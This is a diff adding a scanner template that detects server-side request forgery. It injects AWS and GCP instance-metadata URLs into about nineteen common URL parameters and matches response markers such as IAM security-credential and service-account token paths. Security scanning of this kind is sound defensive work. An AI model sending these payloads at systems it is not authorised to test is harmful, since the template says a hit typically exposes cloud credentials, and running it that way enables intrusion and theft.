@@ -1,0 +1,63 @@
+# gap: owasp-top10-a10-ssrf-metadata-endpoint
+id: owasp-top10-a10-ssrf-metadata-endpoint
+
+info:
+  name: SSRF — Cloud Metadata Service Reachable via User-Controlled URL Parameter
+  author: TyrusRC
+  severity: medium
+  description: |
+    Injects AWS EC2 and GCP Compute instance-metadata URLs into common
+    URL-accepting parameters (url, redirect, fetch, image, endpoint, proxy)
+    and matches metadata response markers in the body. A hit confirms
+    server-side request forgery against the link-local metadata service and
+    typically allows extraction of cloud IAM credentials. Cloud-environment
+    dependent: only fires when the target runs in AWS or GCP and the
+    endpoint forwards arbitrary URLs without an allow-list. GCP responses
+    require Metadata-Flavor: Google to be set by the vulnerable proxy
+    itself, so coverage of GCP via this template is best-effort.
+  reference:
+    - https://owasp.org/Top10/2021/A10_2021-Server_Side_Request_Forgery_%28SSRF%29/
+    - https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/README.md
+  tags: custom,vulnerabilities,ssrf,cloud,aws,gcp,owasp
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?redirect=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?fetch=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?image=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?endpoint=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?proxy=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?file=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?host=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?path=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?u=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?link=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?callback=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?webhook=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/?redirect=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/?fetch=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/?proxy=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/?file=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/?host=http://metadata.google.internal/computeMetadata/v1/"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "iam/security-credentials"
+          - "local-ipv4"
+          - "instance-type"
+          - "availability-zone"
+          - "instance/service-accounts/default/token"
+          - "instance/service-accounts/default/"
+          - "numeric-project-id"
